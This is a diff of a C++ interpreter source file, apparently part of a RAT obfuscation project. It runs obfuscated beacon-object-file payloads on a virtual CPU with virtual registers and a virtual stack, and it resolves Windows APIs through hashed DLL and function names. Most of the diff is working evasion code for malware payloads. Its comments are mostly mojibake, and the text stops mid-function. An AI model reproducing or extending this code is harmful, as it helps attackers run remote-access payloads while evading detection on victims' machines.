@@ -1,202 +1,120 @@
 #include "Interpreter.h"
-#include "Instruction.h"
 
 PVOID pVtStack = NULL;
-DWORD_PTR initRIP = 0x12345678;
-map<string, string> winApiRelocAddrMap;
 
-// ËÆ°ÁÆó (Êú™ËÄÉËôë‚Äú*‚Äù)
-DWORD_PTR Calculate(DWORD_PTR number1, DWORD_PTR number2, char symbol, char obfMap[]) {
-    if (symbol == obfMap['+']) {
-        return number1 + number2;
-    }
-    else if (symbol == obfMap['-']) {
-        return number1 - number2;
-    }
-    throw exception("Symbol incorrect.");
-}
+int dllLoadNum = 0;
+int* dllHashList = NULL;
+HMODULE* dllAddrList = NULL;
 
-// Ëß£ÊûêÁÆóÂºè (Êú™ËÄÉËôë‚Äú*‚Äù)
-void ParseFormula(char* op, char* formula[], char* symbols[], char obfMap[]) {
-    int index = 1;
-    int opLength = strlen(op);
-    for (int i = 0; i < opLength; i++) {
-        if (*(op + i) == obfMap['+']) {
-            formula[index] = symbols[0];
-            *(op + i) = '\0';
-            index += 2;
-        }
-        else if (*(op + i) == obfMap['-']) {
-            formula[index] = symbols[1];
-            *(op + i) = '\0';
-            index += 2;
-        }
-    }
-    index = 0;
-    for (int i = 0; i < opLength; i += strlen(op + i) + 1) {
-        formula[index] = op + i;
-        index += 2;
-    }
-}
+int winApiGetNum = 0;
+int* winApiHashList = NULL;
+PVOID* winApiPtrList = NULL;
 
-// Ëé∑ÂèñÊìç‰ΩúÊï∞ÂÄºÁöÑ Type(iÁ´ãÂç≥Êï∞/rÂØÑÂ≠òÂô®/mÂÜÖÂ≠òÁ©∫Èó¥) & Âú∞ÂùÄ
-DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, DWORD_PTR vtRegs[], DWORD_PTR* pOpNumber, char obfMap[]) {
-    // cout << "CurrentOp: " << op << endl; // Ë∞ÉËØï
-    // Á´ãÂç≥Êï∞
-    if (*op == obfMap['i']) {
-        if (pOpNumber == NULL) {
-            throw exception("IMM failed.");
-        }
-        char* endPtr;
-        *pOpNumber = strtoull(op + 1, &endPtr, 16);
-        if (*endPtr != '\0') {
-            throw exception("IMM incorrect.");
-        }
-        if (pOpType1 != NULL) {
-            *pOpType1 = 'i';
-        }
-        return (DWORD_PTR)pOpNumber;
-    }
-    // lea [] / ptr []
-    else if (*op == obfMap['l'] || *op == obfMap['p']) {
-        // Ëß£ÊûêÁÆóÂºè (Êú™ËÄÉËôë‚Äú*‚Äù)
-        char tempOp[50] = "";
-        string add = string(1, obfMap['+']);
-        string sub = string(1, obfMap['-']);
-        char* symbols[] = { (char*)add.c_str(), (char*)sub.c_str() };
-        char* formula[] = { NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL };
-        strcpy_s(tempOp, sizeof(tempOp), op + 1);
-        ParseFormula(tempOp, formula, symbols, obfMap);
-        // ËÆ°ÁÆó (Êú™ËÄÉËôë‚Äú*‚Äù)
-        char symbol = obfMap['+'];
-        DWORD_PTR number1 = 0;
-        DWORD_PTR number2 = NULL;
-        for (int i = 0; formula[i] != NULL; i++) {
-            if (*formula[i] == obfMap['i']) {
-                DWORD_PTR tempNumber; // Â≠òÂÇ®Êï∞Â≠ó
-                GetOpTypeAndAddr(formula[i], NULL, vtRegs, &tempNumber, obfMap);
-                number1 = Calculate(number1, tempNumber, symbol, obfMap);
-            }
-            else if (*formula[i] == obfMap['q']) {
-                number2 = *(PDWORD64)GetOpTypeAndAddr(formula[i], NULL, vtRegs, NULL, obfMap);
-                number1 = Calculate(number1, number2, symbol, obfMap);
-            }
-            else if (*formula[i] == obfMap['d']) {
-                number2 = *(PDWORD)GetOpTypeAndAddr(formula[i], NULL, vtRegs, NULL, obfMap);
-                number1 = Calculate(number1, number2, symbol, obfMap);
-            }
-            else if (*formula[i] == obfMap['w']) {
-                number2 = *(PWORD)GetOpTypeAndAddr(formula[i], NULL, vtRegs, NULL, obfMap);
-                number1 = Calculate(number1, number2, symbol, obfMap);
-            }
-            else if (*formula[i] == obfMap['b']) {
-                number2 = *(PBYTE)GetOpTypeAndAddr(formula[i], NULL, vtRegs, NULL, obfMap);
-                number1 = Calculate(number1, number2, symbol, obfMap);
-            }
-            else if (*formula[i] == obfMap['+']) {
-                symbol = obfMap['+'];
-            }
-            else if (*formula[i] == obfMap['-']) {
-                symbol = obfMap['-'];
-            }
-        }
-        // lea []
-        if (*op == obfMap['l']) {
-            if (pOpNumber == NULL) {
-                throw exception("lea failed.");
-            }
-            *pOpNumber = number1;
-            return (DWORD_PTR)pOpNumber;
-        }
-        // ptr []
-        if (pOpType1 != NULL) {
-            *pOpType1 = 'm';
-        }
-        return number1;
-    }
-    // ÂØÑÂ≠òÂô®
-    else if (*op == obfMap['q'] || *op == obfMap['d'] || *op == obfMap['w'] || *op == obfMap['b']) {
-        char* endPtr;
-        DWORD_PTR offset = strtoull(op + 1, &endPtr, 16);
-        if (*endPtr != '\0') {
-            throw exception("Reg offset incorrect.");
-        }
-        if (pOpType1 != NULL) {
-            *pOpType1 = 'r';
-        }
-        return (DWORD_PTR)vtRegs + offset;
-    }
-    throw exception("Op type not exist."); // ‰∏çÊòØ OpType
-}
+__declspec(noinline) int GetHash(char* string, int length);
+__declspec(noinline) DWORD_PTR Calculate(DWORD_PTR number1, DWORD_PTR number2, char symbol);
+__declspec(noinline) DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, DWORD_PTR vtRegs[], DWORD_PTR* pOpNumber);
+__declspec(noinline) int TextReloc(char* op, char* textRelocNames, PVOID pRdata, int& relocIndex);
+__declspec(noinline) int InvokeInstruction(BYTE mnemonicIndex, char opType1, char opBit1, DWORD_PTR opAddr1, char opBit2, DWORD_PTR opAddr2, DWORD_PTR vtRegs[]);
 
-// ËøêË°å BOF ÂáΩÊï∞
-void RunBofFunc(char* bofFuncName, BofPayload& bofPayload, DWORD_PTR vtRegs[]) {
-    if (bofPayload.bofFuncOffsetMap.find(bofFuncName) == bofPayload.bofFuncOffsetMap.end()) {
-        throw exception("BofFuncName does not exist");
-    }
-    DWORD_PTR bofFuncVtAddr = bofPayload.bofFuncOffsetMap[bofFuncName];
-    for (int index = bofPayload.indexMap[bofFuncVtAddr]; index < bofPayload.selfAsmLength; index++) {
-        vtRegs[16] = bofPayload.vtAddrMap[index];
-        int mnemonicIndex = bofPayload.selfAsmMap[vtRegs[16]]->mnemonicIndex;
-        char* opBit1 = bofPayload.selfAsmMap[vtRegs[16]]->opBit1;
-        char* op1 = bofPayload.selfAsmMap[vtRegs[16]]->op1;
-        char* opBit2 = bofPayload.selfAsmMap[vtRegs[16]]->opBit2;
-        char* op2 = bofPayload.selfAsmMap[vtRegs[16]]->op2;
+/*
+// ª˙∆˜¬ÎªÏœ˝œÓƒøœ‡πÿ: https://github.com/HackerCalico/RAT_Obfuscator
+#pragma code_seg(".shell$1")
 
-        // Ë∞ÉËØï
-        /*cout << "Register:\n";
-        for (int i = 0; i < 18; i++) {
-            cout << dec << i << " " << hex << vtRegs[i] << endl;
-        }
-        cout << "Index:" << dec << index;
-        cout << " VtAddr:" << hex << vtRegs[16];
-        cout << " MnemonicIndex:" << dec << mnemonicIndex;
-        cout << " OpBit1:" << opBit1;
-        cout << " Op1:" << op1;
-        cout << " OpBit2:" << opBit2;
-        cout << " Op2:" << op2 << endl;*/
-
-        // Ëé∑Âèñ‰∏§‰∏™Êìç‰ΩúÊï∞ÁöÑ Type(iÁ´ãÂç≥Êï∞/rÂØÑÂ≠òÂô®/mÂÜÖÂ≠òÁ©∫Èó¥) & Âú∞ÂùÄ
-        char opType1 = NULL;
-        DWORD_PTR opAddr1 = NULL;
-        DWORD_PTR opAddr2 = NULL;
-        DWORD_PTR opNumber = NULL; // Â≠òÂÇ®Êï∞Â≠ó
-        if (*op1 != '\0') {
-            opAddr1 = GetOpTypeAndAddr(op1, &opType1, vtRegs, &opNumber, bofPayload.obfMap);
-            if (opAddr1 == NULL || opType1 == NULL) {
-                throw exception("Op1 incorrect.");
-            }
-            // cout << "Op1 Addr: " << hex << opAddr1 << endl; // Ë∞ÉËØï
-        }
-        else if (*op2 != '\0') {
-            throw exception("Op2 incorrect.");
-        }
-        if (*op2 != '\0') {
-            opAddr2 = GetOpTypeAndAddr(op2, NULL, vtRegs, &opNumber, bofPayload.obfMap);
-            if (opAddr2 == NULL) {
-                throw exception("Op2 incorrect.");
-            }
-            // cout << "Op2 Addr: " << hex << opAddr2 << endl; // Ë∞ÉËØï
-        }
-
-        // Ë∞ÉÁî®Êåá‰ª§
-        if (InvokeInstruction(mnemonicIndex, opType1, *opBit1, opAddr1, *opBit2, opAddr2, vtRegs, bofPayload.obfMap)) {
-            if (vtRegs[16] == initRIP) {
-                return;
-            }
-            index = bofPayload.indexMap[vtRegs[16]]; // Jcc Êåá‰ª§Ë∑≥ËΩ¨
-            index--;
-        }
+// ±£÷§’ºŒª‘⁄ .shell ÷√∂•
+__attribute__((naked)) void Placeholding1() {
+    __asm {
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
+        mov rax, 0x00
     }
 }
 
-void MagicInvoke(char* bofFuncName, char* commandPara, int commandParaLength, char*& outputData, int& outputDataLength, PVOID specialParaList[], BofPayload& bofPayload) {
-    // ÂàõÂª∫ËôöÊãüÊ†à
+#pragma code_seg(".shell$2")
+*/
+
+// ±£÷§ RunPayload ΩÙ∞§’ºŒªœ¬∑Ω
+int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPara, int commandParaLen, char*& outputData, int& outputDataLen, PVOID specialParaList[]) {    
+    // Ω‚Œˆ Payload
+    if (payloadSize < sizeof(WORD)) {
+        return 0;
+    }
+    WORD bofFuncOffsetMapLen = *(PWORD)pPayload;
+    PBYTE pBofFuncOffsetMap = pPayload + sizeof(WORD);
+    if (payloadSize < sizeof(WORD) * 2 + bofFuncOffsetMapLen) {
+        return 0;
+    }
+    WORD textRelocNamesLen = *(PWORD)(pBofFuncOffsetMap + bofFuncOffsetMapLen);
+    char* textRelocNames = (char*)pBofFuncOffsetMap + bofFuncOffsetMapLen + sizeof(WORD);
+    if (payloadSize < sizeof(WORD) * 3 + bofFuncOffsetMapLen + textRelocNamesLen) {
+        return 0;
+    }
+    WORD selfAsmLen = *(PWORD)(textRelocNames + textRelocNamesLen);
+    char* selfAsm = textRelocNames + textRelocNamesLen + sizeof(WORD);
+    if (payloadSize < sizeof(WORD) * 3 + bofFuncOffsetMapLen + textRelocNamesLen + selfAsmLen) {
+        return 0;
+    }
+    PVOID pRdata = selfAsm + selfAsmLen;
+
+    // ≤È’“ BOF ∫Ø ˝–Èƒ‚µÿ÷∑
+    WORD bofFuncVtAddr = 0xFFFF;
+    for (int i = 0; i < bofFuncOffsetMapLen; i += 6) {
+        if (*(int*)(pBofFuncOffsetMap + i) == bofFuncHash) {
+            bofFuncVtAddr = *(PWORD)(pBofFuncOffsetMap + i + sizeof(int));
+            break;
+        }
+    }
+    if (bofFuncVtAddr == 0xFFFF) {
+        return 0;
+    }
+
+    // .text ÷ÿ∂®Œª
+    int relocIndex = 0;
+    for (int offset = 0; offset < selfAsmLen;) {
+        offset += 4;
+        char* op1 = selfAsm + offset;
+        offset += strlen(op1) + 2;
+        char* op2 = selfAsm + offset;
+        offset += strlen(op2) + 1;
+        if (!TextReloc(op1, textRelocNames, pRdata, relocIndex)) {
+            return 0;
+        }
+        if (!TextReloc(op2, textRelocNames, pRdata, relocIndex)) {
+            return 0;
+        }
+    }
+
+    // ¥¥Ω®–Èƒ‚’ª
     if (pVtStack == NULL) {
         pVtStack = malloc(0x10000);
     }
-
-    // ÂàõÂª∫ËôöÊãüÂØÑÂ≠òÂô®
+    // ¥¥Ω®–Èƒ‚ºƒ¥Ê∆˜
     /*
     * 0  RAX
     * 1  RBX
@@ -218,177 +136,696 @@ void MagicInvoke(char* bofFuncName, char* commandPara, int commandParaLength, ch
     * 17 EFL
     */
     DWORD_PTR vtRegs[18];
-    vtRegs[16] = initRIP;
     vtRegs[14] = vtRegs[15] = (DWORD_PTR)pVtStack + 0x9000;
-
-    // ËÆæÁΩÆËôöÊãüÂØÑÂ≠òÂô®ÁöÑÂàùÂÄº
+    // ≥ı ºªØ–Èƒ‚ºƒ¥Ê∆˜
     /*
-    * BofFunc(commandPara, commandParaLength, &outputData, &outputDataLength, specialParaList);
+    * BofFunc(commandPara, commandParaLen, &outputData, &outputDataLen, specialParaList);
     * lea rax, [specialParaList]
     * mov qword ptr [rsp+20h], rax
-    * lea r9, [outputDataLength]
+    * lea r9, [outputDataLen]
     * lea r8, [outputData]
-    * mov edx, dword ptr [commandParaLength]
+    * mov edx, dword ptr [commandParaLen]
     * lea rcx, [commandPara]
     * call BofFunc
     */
     vtRegs[0] = (DWORD_PTR)specialParaList;
     *(PDWORD_PTR)(vtRegs[14] + 0x20) = vtRegs[0];
-    vtRegs[7] = (DWORD_PTR)&outputDataLength;
+    vtRegs[7] = (DWORD_PTR)&outputDataLen;
     vtRegs[6] = (DWORD_PTR)&outputData;
-    vtRegs[3] = commandParaLength;
+    vtRegs[3] = commandParaLen;
     vtRegs[2] = (DWORD_PTR)commandPara;
     vtRegs[14] -= sizeof(DWORD_PTR);
-    *(PDWORD_PTR)vtRegs[14] = vtRegs[16];
+    *(PDWORD_PTR)vtRegs[14] = 0xFFFFFFFFFFFFFFFF;
 
-    // ËøêË°å BOF ÂáΩÊï∞
-    RunBofFunc(bofFuncName, bofPayload, vtRegs);
+    // ‘À–– BOF ∫Ø ˝
+    WORD targetVtAddr = 0xFFFF;
+    for (int offset = 0; offset < selfAsmLen;) {
+        WORD vtAddr = *(PWORD)(selfAsm + offset);
+        offset += sizeof(WORD);
+        if (vtAddr == bofFuncVtAddr) {
+            targetVtAddr = vtAddr;
+            bofFuncVtAddr = 0xFFFF;
+        }
+
+        BYTE mnemonicIndex = *(PBYTE)(selfAsm + offset);
+        offset += sizeof(BYTE);
+        char opBit1 = *(char*)(selfAsm + offset);
+        offset += sizeof(char);
+        char* op1 = selfAsm + offset;
+        offset += strlen(op1) + 1;
+        char opBit2 = *(char*)(selfAsm + offset);
+        offset += sizeof(char);
+        char* op2 = selfAsm + offset;
+        offset += strlen(op2) + 1;
+
+        if (vtAddr >= targetVtAddr) {
+            vtRegs[16] = vtAddr;
+            // ªÒ»°¡Ω∏ˆ≤Ÿ◊˜ ˝µƒ Type(i¡¢º¥ ˝/rºƒ¥Ê∆˜/mƒ⁄¥Êø’º‰) ∫Õ µÿ÷∑
+            char opType1 = NULL;
+            DWORD_PTR opAddr1 = NULL;
+            DWORD_PTR opAddr2 = NULL;
+            DWORD_PTR opNumber = NULL;
+            if (*op1 != '\0') {
+                opAddr1 = GetOpTypeAndAddr(op1, &opType1, vtRegs, &opNumber);
+                if (opAddr1 == NULL || opType1 == NULL) {
+                    return 0;
+                }
+            }
+            else if (*op2 != '\0') {
+                return 0;
+            }
+            if (*op2 != '\0') {
+                opAddr2 = GetOpTypeAndAddr(op2, NULL, vtRegs, &opNumber);
+                if (opAddr2 == NULL) {
+                    return 0;
+                }
+            }
+            // µ˜”√÷∏¡Ó
+            // printf("vtAddr: 0x%llx, mnemonicIndex: %d, opBit1: %c, op1: %s, opBit2: %c, op2: %s\n", vtAddr, mnemonicIndex, opBit1, op1, opBit2, op2);
+            int isJmp = InvokeInstruction(mnemonicIndex, opType1, opBit1, opAddr1, opBit2, opAddr2, vtRegs);
+            if (isJmp == 2) {
+                return 0;
+            }
+            else if (isJmp) {
+                if (vtRegs[16] == 0xFFFFFFFFFFFFFFFF) {
+                    return GetHash(selfAsm, selfAsmLen);
+                }
+                targetVtAddr = vtRegs[16];
+                offset = 0;
+            }
+            // printf("RAX: 0x%llx\nRBX: 0x%llx\nRCX: 0x%llx\nRDX: 0x%llx\nRSI: 0x%llx\nRDI: 0x%llx\nR8: 0x%llx\nR9: 0x%llx\nR10: 0x%llx\nR11: 0x%llx\nR12: 0x%llx\nR13: 0x%llx\nR14: 0x%llx\nR15: 0x%llx\nRSP: 0x%llx\nRBP: 0x%llx\nRIP: 0x%llx\nELF: 0x%llx\n", vtRegs[0], vtRegs[1], vtRegs[2], vtRegs[3], vtRegs[4], vtRegs[5], vtRegs[6], vtRegs[7], vtRegs[8], vtRegs[9], vtRegs[10], vtRegs[11], vtRegs[12], vtRegs[13], vtRegs[14], vtRegs[15], vtRegs[16], vtRegs[17]);
+            // printf("\n");
+        }
+    }
+    return 0;
 }
 
-// .text ÈáçÂÆö‰Ωç
-char* TextReloc(char* op, int& relocIndex, vector<string>& textRelocNameVector, BofPayload& bofPayload) {
-    char relocAddr[18];
-    char* rip = strstr(op, (string(1, bofPayload.obfMap['r']) + "0000000000000000").c_str());
-    if (rip != NULL) {
-        if (!strcmp(textRelocNameVector[relocIndex].c_str(), ".rdata")) {
-            sprintf_s(relocAddr, sizeof(relocAddr), "%c%016llx", bofPayload.obfMap['i'], (DWORD_PTR)bofPayload.pRdata);
-            memcpy(rip, relocAddr, 17);
+__declspec(noinline) int GetHash(char* string, int length) {
+    int hash = 0;
+    for (int i = 0; i < length; i++) {
+        hash += string[i];
+        hash = (hash << 8) - hash;
+    }
+    return hash;
+}
+
+// º∆À„ (Œ¥øº¬«°∞*°±)
+__declspec(noinline) DWORD_PTR Calculate(DWORD_PTR number1, DWORD_PTR number2, char symbol) {
+    if (symbol == '+') {
+        return number1 + number2;
+    }
+    else {
+        return number1 - number2;
+    }
+}
+
+// ªÒ»°≤Ÿ◊˜ ˝÷µµƒ ¿‡–Õ(i¡¢º¥ ˝/rºƒ¥Ê∆˜/mƒ⁄¥Êø’º‰) ∫Õ µÿ÷∑
+__declspec(noinline) DWORD_PTR GetOpTypeAndAddr(char* op, char* pOpType1, DWORD_PTR vtRegs[], DWORD_PTR* pOpNumber) {
+    // ¡¢º¥ ˝
+    if (*op == 'i') {
+        if (pOpNumber == NULL) {
+            return NULL;
         }
-        else {
-            if (winApiRelocAddrMap.find(textRelocNameVector[relocIndex].c_str()) != winApiRelocAddrMap.end()) {
-                memcpy(rip, winApiRelocAddrMap[textRelocNameVector[relocIndex].c_str()].c_str(), 17);
+        char* endPtr;
+        *pOpNumber = strtoull(op + 1, &endPtr, 16);
+        if (*endPtr != '\0') {
+            return NULL;
+        }
+        if (pOpType1 != NULL) {
+            *pOpType1 = 'i';
+        }
+        return (DWORD_PTR)pOpNumber;
+    }
+    // lea [] / ptr []
+    else if (*op == 'l' || *op == 'p') {
+        // º∆À„ (Œ¥øº¬«°∞*°±)
+        int formulaLen = 1;
+        while (op[formulaLen] != '\0') {
+            if (op[formulaLen] == '+' || op[formulaLen] == '-') {
+                op[formulaLen] = '\0';
+                formulaLen++;
+            }
+            formulaLen++;
+        }
+        char symbol = '+';
+        DWORD_PTR number1 = 0;
+        DWORD_PTR number2 = NULL;
+        DWORD_PTR tempNumber = NULL;
+        for (int i = 1; i < formulaLen;) {
+            if (op[i] == 'i' || op[i] == 'q' || op[i] == 'd' || op[i] == 'w' || op[i] == 'b') {
+                number2 = GetOpTypeAndAddr(op + i, NULL, vtRegs, &tempNumber);
+                if (number2 == NULL) {
+                    return NULL;
+                }
+                if (op[i] == 'i') {
+                    number1 = Calculate(number1, *(PDWORD_PTR)number2, symbol);
+                }
+                else if (op[i] == 'q') {
+                    number1 = Calculate(number1, *(PDWORD64)number2, symbol);
+                }
+                else if (op[i] == 'd') {
+                    number1 = Calculate(number1, *(PDWORD)number2, symbol);
+                }
+                else if (op[i] == 'w') {
+                    number1 = Calculate(number1, *(PWORD)number2, symbol);
+                }
+                else if (op[i] == 'b') {
+                    number1 = Calculate(number1, *(PBYTE)number2, symbol);
+                }
+                i += strlen(op + i) + 1;
+            }
+            else if (op[i] == '+' || op[i] == '-') {
+                symbol = op[i];
+                op[i - 1] = symbol;
+                i++;
             }
             else {
-                char dllName[50];
-                sprintf_s(dllName, sizeof(dllName), "%s", textRelocNameVector[relocIndex].c_str());
-                char* dollar = strchr(dllName, '$');
-                if (dollar != NULL) {
-                    *dollar = '\0';
-                    char* funcName = dllName + strlen(dllName) + 1;
-                    HMODULE hDll;
-                    if (!strcmp(dllName, "Ntdll") || !strcmp(dllName, "Kernel32")) {
-                        hDll = GetModuleHandleA(dllName);
+                return NULL;
+            }
+        }
+        // lea []
+        if (*op == 'l') {
+            if (pOpNumber == NULL) {
+                return NULL;
+            }
+            *pOpNumber = number1;
+            return (DWORD_PTR)pOpNumber;
+        }
+        // ptr []
+        if (pOpType1 != NULL) {
+            *pOpType1 = 'm';
+        }
+        return number1;
+    }
+    // ºƒ¥Ê∆˜
+    else if (*op == 'q' || *op == 'd' || *op == 'w' || *op == 'b') {
+        char* endPtr;
+        DWORD_PTR offset = strtoull(op + 1, &endPtr, 16);
+        if (*endPtr != '\0') {
+            return NULL;
+        }
+        if (pOpType1 != NULL) {
+            *pOpType1 = 'r';
+        }
+        return (DWORD_PTR)vtRegs + offset;
+    }
+    return NULL;
+}
+
+__declspec(noinline) int TextReloc(char* op, char* textRelocNames, PVOID pRdata, int& relocIndex) {
+    if (dllHashList == NULL) {
+        dllHashList = (int*)malloc(1000 * sizeof(int));
+        dllAddrList = (HMODULE*)malloc(1000 * sizeof(HMODULE));
+        winApiHashList = (int*)malloc(1000 * sizeof(int));
+        winApiPtrList = (PVOID*)malloc(1000 * sizeof(PVOID));
+    }
+    else if (dllLoadNum >= 1000 || winApiGetNum >= 1000) {
+        return 0;
+    }
+    char* rip = strchr(op, 'r'); // r0000000000000000
+    if (rip != NULL && *(PDWORD_PTR)(rip + 1) == 0x3030303030303030) {
+        char end = rip[17];
+        for (int count = 0; count < relocIndex; textRelocNames++) {
+            if (*textRelocNames == '\0') {
+                count++;
+            }
+        }
+        char* format = "i%016llx";
+        if (GetHash(textRelocNames, strlen(textRelocNames)) == -1394134574) { // .rdata
+            sprintf_s(rip, 18, format, (DWORD_PTR)pRdata);
+        }
+        else {
+            char* dollar = strchr(textRelocNames, '$');
+            if (dollar != NULL) {
+                *dollar = '\0';
+                // DLL
+                int isExist = 0;
+                HMODULE hDll = NULL;
+                int dllHash = GetHash(textRelocNames, strlen(textRelocNames));
+                for (int i = 0; i < dllLoadNum; i++) {
+                    if (dllHashList[i] == dllHash) {
+                        isExist = 1;
+                        hDll = dllAddrList[i];
+                        break;
+                    }
+                }
+                if (!isExist) {
+                    if (dllHash == -1499897628) { // Kernel32
+                        hDll = GetModuleHandleA(textRelocNames);
                     }
                     else {
-                        hDll = LoadLibraryA(dllName);
+                        hDll = LoadLibraryA(textRelocNames);
                     }
-                    if (hDll != NULL) {
-                        DWORD_PTR funcAddr = (DWORD_PTR)GetProcAddress(hDll, funcName);
-                        if (funcAddr != NULL) {
-                            PVOID winApiPtr = malloc(sizeof(DWORD_PTR));
-                            *(PDWORD_PTR)winApiPtr = funcAddr;
-                            sprintf_s(relocAddr, sizeof(relocAddr), "%c%016llx", bofPayload.obfMap['i'], (DWORD_PTR)winApiPtr);
-                            winApiRelocAddrMap[textRelocNameVector[relocIndex].c_str()] = relocAddr;
-                            memcpy(rip, relocAddr, 17);
-                        }
-                        else {
-                            throw exception("GetProcAddress failed.");
-                        }
+                    dllHashList[dllLoadNum] = dllHash;
+                    dllAddrList[dllLoadNum] = hDll;
+                    dllLoadNum++;
+                }
+                if (hDll == NULL) {
+                    return 0;
+                }
+                // Windows Api
+                isExist = 0;
+                PVOID pWinApi;
+                int winApiHash = GetHash(dollar + 1, strlen(dollar + 1));
+                for (int i = 0; i < winApiGetNum; i++) {
+                    if (winApiHashList[i] == winApiHash) {
+                        isExist = 1;
+                        pWinApi = winApiPtrList[i];
+                        break;
                     }
-                    else {
-                        throw exception("Get Dll failed.");
+                }
+                if (!isExist) {
+                    DWORD_PTR winApiAddr = (DWORD_PTR)GetProcAddress(hDll, dollar + 1);
+                    if (winApiAddr == 0) {
+                        return 0;
+                    }
+                    pWinApi = malloc(sizeof(DWORD_PTR));
+                    *(PDWORD_PTR)pWinApi = winApiAddr;
+                    winApiHashList[winApiGetNum] = winApiHash;
+                    winApiPtrList[winApiGetNum] = pWinApi;
+                    winApiGetNum++;
+                }
+                *dollar = '$';
+                sprintf_s(rip, 18, format, (DWORD_PTR)pWinApi);
+            }
+            else {
+                return 0;
+            }
+        }
+        rip[17] = end;
+        relocIndex++;
+    }
+    return 1;
+}
+
+__declspec(noinline) int InvokeInstruction(BYTE mnemonicIndex, char opType1, char opBit1, DWORD_PTR opAddr1, char opBit2, DWORD_PTR opAddr2, DWORD_PTR vtRegs[]) {
+    const int pushIndex = 0, popIndex = 1, callIndex = 2, retIndex = 3, movzxIndex = 4, movsxdIndex = 5, cmpIndex = 6, testIndex = 7, shlIndex = 8, shrIndex = 9, nopIndex = 10, movIndex = 11, movabsIndex = 12, leaIndex = 13, addIndex = 14, incIndex = 15, subIndex = 16, decIndex = 17, andIndex = 18, orIndex = 19, xorIndex = 20, jmpIndex = 21, jeIndex = 22, jneIndex = 23, jbeIndex = 24, jlIndex = 25, jgeIndex = 26, jleIndex = 27;
+    if (mnemonicIndex < 0 || mnemonicIndex > 27) {
+        return 2;
+    }
+    DWORD_PTR vtRIP = vtRegs[16];
+
+    if (mnemonicIndex >= jmpIndex) {
+        __asm {
+            mov r14, 0x01
+            mov r15, qword ptr[vtRegs]
+            mov r15, qword ptr[r15 + 0x88] // vtEFL
+        }
+        if (mnemonicIndex == jeIndex) {
+            __asm {
+                push r15
+                popf
+                je isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        else if (mnemonicIndex == jneIndex) {
+            __asm {
+                push r15
+                popf
+                jne isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        else if (mnemonicIndex == jbeIndex) {
+            __asm {
+                push r15
+                popf
+                jbe isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        else if (mnemonicIndex == jlIndex) {
+            __asm {
+                push r15
+                popf
+                jl isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        else if (mnemonicIndex == jgeIndex) {
+            __asm {
+                push r15
+                popf
+                jge isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        else if (mnemonicIndex == jleIndex) {
+            __asm {
+                push r15
+                popf
+                jle isJmp
+                mov r14, 0x00
+                isJmp:
+            }
+        }
+        __asm {
+            cmp r14, 0x01
+            jne notJmp
+            mov rax, qword ptr[opAddr1]
+            mov rbx, qword ptr[rax]
+            mov rax, qword ptr[vtRegs]
+            mov qword ptr[rax + 0x80], rbx // vtRIP
+            notJmp:
+        }
+    }
+    else if (mnemonicIndex > nopIndex) {
+        if (opAddr1 == NULL) {
+            return 2;
+        }
+        if (opAddr2 != NULL) {
+            __asm {
+                mov r12, qword ptr[opAddr2]
+                mov r12, qword ptr[r12]
+            }
+        }
+        __asm {
+            mov r10, qword ptr[opAddr1]
+            mov r11, qword ptr[r10]
+        }
+        if (mnemonicIndex == movIndex || mnemonicIndex == movabsIndex || mnemonicIndex == leaIndex) {
+            __asm {
+                mov r11, r12
+            }
+        }
+        else if (mnemonicIndex == addIndex) {
+            __asm {
+                add r11, r12
+            }
+        }
+        else if (mnemonicIndex == incIndex) {
+            __asm {
+                inc r11
+            }
+        }
+        else if (mnemonicIndex == subIndex) {
+            __asm {
+                sub r11, r12
+            }
+        }
+        else if (mnemonicIndex == decIndex) {
+            __asm {
+                dec r11
+            }
+        }
+        else if (mnemonicIndex == andIndex) {
+            __asm {
+                and r11, r12
+            }
+        }
+        else if (mnemonicIndex == orIndex) {
+            __asm {
+                or r11, r12
+            }
+        }
+        else if (mnemonicIndex == xorIndex) {
+            __asm {
+                xor r11, r12
+            }
+        }
+        if (opBit1 == 'q') {
+            __asm {
+                mov qword ptr[r10], r11
+            }
+        }
+        else if (opBit1 == 'd') {
+            if (opType1 == 'r') {
+                __asm {
+                    mov qword ptr[r10], r11
+                }
+            }
+            else {
+                __asm {
+                    mov dword ptr[r10], r11d
+                }
+            }
+        }
+        else if (opBit1 == 'w') {
+            __asm {
+                mov word ptr[r10], r11w
+            }
+        }
+        else if (opBit1 == 'b') {
+            __asm {
+                mov byte ptr[r10], r11b
+            }
+        }
+    }
+    else if (mnemonicIndex != nopIndex) {
+        if (mnemonicIndex == pushIndex) {
+            vtRegs[14] -= sizeof(DWORD_PTR);
+            *(PDWORD_PTR)(vtRegs[14]) = *(PDWORD_PTR)(opAddr1);
+        }
+        else if (mnemonicIndex == popIndex) {
+            *(PDWORD_PTR)(opAddr1) = *(PDWORD_PTR)(vtRegs[14]);
+            vtRegs[14] += sizeof(DWORD_PTR);
+        }
+        else if (mnemonicIndex == callIndex) {
+            DWORD_PTR realRSP;
+            DWORD_PTR callAddr = *(PDWORD_PTR)opAddr1;
+            // BOF ƒ⁄≤ø∫Ø ˝µ˜”√
+            if (callAddr < 0xFFFF) {
+                vtRegs[14] -= sizeof(DWORD_PTR);
+                *(PDWORD_PTR)vtRegs[14] = vtRegs[16] + 5;
+                vtRegs[16] = callAddr;
+            }
+            else {
+                __asm {
+                    // ±£¥Ê’Ê µ’ª∂•
+                    mov realRSP, rsp
